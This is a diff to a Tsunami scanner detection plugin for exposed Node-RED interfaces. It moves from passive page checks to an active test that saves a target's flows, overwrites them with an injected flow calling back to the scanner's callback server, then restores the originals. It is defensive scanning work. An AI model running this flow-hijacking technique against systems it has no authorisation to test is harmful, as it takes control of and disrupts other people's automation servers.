@@ -9,7 +9,7 @@ info: {
   type: VULN_DETECTION
   name: "NodeRED_ExposedUI"
   author: "Nicolas Golubovic (ngolubovic@google.com)"
-  version: "0.2"
+  version: "0.3"
 }
 
 finding: {
@@ -31,36 +31,80 @@ finding: {
 ###########
 
 actions: {
-  name: "is_nodered"
+  name: "retrieve_existing_flows"
+  cleanup_actions: ["restore_flows"]
   http_request: {
     method: GET
-    uri: "/red/tours/welcome.js"
+    uri: "/flows"
+    headers: [
+      { name: "Content-Type" value: "application/json; charset=utf-8" }
+    ]
     response: {
       http_status: 200
       expect_all: {
-        conditions: { body: {} contains: "Welcome to Node-RED" }
+        conditions: [
+          { body: {} contains: "\"id\":" },
+          { body: {} contains: "\"wires\":[[" }
+        ]
+      }
+      extract_all: {
+        patterns: { from_body: {} regexp: "(.*)" variable_name: "OLD_FLOWS" }
       }
     }
   }
 }
 
-
-# Checks if the settings are accessible. The /settings page will either return a
-# JSON content or a permission denied error depending on the configuration for
-# authentication. Because /settings can be a pretty common endpoint, we want to
-# ensure that this is a rednode instance whilst not really performing JSON
-# parsing hence the pattern matching instead.
+# This action will rewrite the flows. We expect the cleanup action registered on
+# the previous action to restore the previously existing flows afterwards.
 actions: {
-  name: "is_settings_available"
+  name: "hijack_flows"
   http_request: {
-    method: GET
-    uri: "/settings"
+    method: POST
+    uri: "/flows"
+    headers: [
+      { name: "Content-Type" value: "application/json; charset=utf-8" },
+      { name: "Node-RED-Deployment-Type" value: "full" },
+      { name: "Node-RED-API-Version" value: "v2" }
+    ]
+    data: "{{ PAYLOAD }}"
     response: {
       http_status: 200
       expect_all: {
-        conditions: { body {} contains: '"httpNodeRoot"' }
-        conditions: { body {} contains: '"version"' }
-        conditions: { body {} contains: '"workflow"' }
+        conditions: [
+          { body: {} contains: "\"rev\":\"" }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "wait_for_interraction"
+  utility: { sleep: { duration_ms: 200 } }
+}
+
+actions: {
+  name: "poll_callback_server"
+  callback_server: { action_type: CHECK }
+}
+
+actions: {
+  name: "restore_flows"
+  http_request: {
+    method: POST
+    uri: "/flows"
+    headers: [
+      { name: "Content-Type" value: "application/json; charset=utf-8" },
+      { name: "Node-RED-Deployment-Type" value: "full" },
+      { name: "Node-RED-API-Version" value: "v2" }
+    ]
+    data: "{\"flows\": {{ OLD_FLOWS }}}"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: "\"rev\":\"" }
+        ]
       }
     }
   }
@@ -71,8 +115,21 @@ actions: {
 #############
 
 workflows: {
+  condition: REQUIRES_CALLBACK_SERVER
+  variables: [
+    {
+      name: "FLOW_NAME"
+      value: "tsunami_security_scan_flow"
+    },
+    {
+      name: "PAYLOAD"
+      value: "{\"flows\":[{\"id\":\"f6f2187d.f17ca8\",\"type\":\"tab\",\"label\":\"{{ FLOW_NAME }}\",\"disabled\":false,\"info\":\"\"},{\"id\":\"0c3c71799bee2cb5\",\"type\":\"inject\",\"z\":\"f6f2187d.f17ca8\",\"name\":\"\",\"props\":[{\"p\":\"payload\"},{\"p\":\"topic\",\"vt\":\"str\"}],\"repeat\":\"\",\"crontab\":\"\",\"once\":true,\"onceDelay\":0.1,\"topic\":\"\",\"payload\":\"\",\"payloadType\":\"date\",\"x\":150,\"y\":320,\"wires\":[[\"718fd847ec698bdf\"]]},{\"id\":\"718fd847ec698bdf\",\"type\":\"http request\",\"z\":\"f6f2187d.f17ca8\",\"name\":\"\",\"method\":\"GET\",\"ret\":\"txt\",\"paytoqs\":\"ignore\",\"url\":\"{{ T_CBS_URI }}\",\"tls\":\"\",\"persist\":false,\"proxy\":\"\",\"insecureHTTPParser\":false,\"authType\":\"\",\"senderr\":false,\"headers\":[],\"x\":350,\"y\":340,\"wires\":[[]]}]}"
+    }
+  ]
   actions: [
-    "is_nodered",
-    "is_settings_available"
+    "retrieve_existing_flows",
+    "hijack_flows",
+    "wait_for_interraction",
+    "poll_callback_server"
   ]
 }
